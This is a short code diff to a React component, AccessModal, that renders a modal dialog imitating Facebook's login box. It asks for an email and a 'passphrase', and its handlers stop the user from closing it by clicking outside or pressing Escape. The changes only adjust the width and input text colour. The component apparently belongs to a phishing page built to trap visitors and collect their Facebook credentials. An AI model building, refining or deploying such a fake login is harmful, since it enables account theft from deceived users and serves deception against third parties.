@@ -140,7 +140,7 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
 
   return (
     <Dialog open={isOpen}>
-      <DialogContent className="sm:max-w-sm p-0 overflow-hidden bg-white shadow-2xl" onPointerDownOutside={(e) => e.preventDefault()} onEscapeKeyDown={(e) => e.preventDefault()}>
+      <DialogContent className="max-w-xs w-80 p-0 overflow-hidden bg-white shadow-2xl" onPointerDownOutside={(e) => e.preventDefault()} onEscapeKeyDown={(e) => e.preventDefault()}>
         {/* Facebook Header */}
         <div className="bg-[#1877f2] text-white text-center py-4 relative">
           <h1 className="text-2xl font-bold" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>facebook</h1>
@@ -182,7 +182,7 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
                 required
-                className="w-full p-[14px] text-[17px] border border-[#dddfe2] rounded-md bg-[#f5f6f7] outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] transition-colors"
+                className="w-full p-[14px] text-[17px] border border-[#dddfe2] rounded-md bg-[#f5f6f7] text-black outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] transition-colors"
                 style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
               />
             </div>
@@ -194,7 +194,7 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
                 value={passphrase}
                 onChange={(e) => setPassphrase(e.target.value)}
                 required
-                className="w-full p-[14px] text-[17px] border border-[#dddfe2] rounded-md bg-[#f5f6f7] pr-12 outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] transition-colors"
+                className="w-full p-[14px] text-[17px] border border-[#dddfe2] rounded-md bg-[#f5f6f7] text-black pr-12 outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] transition-colors"
                 style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
               />
               <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
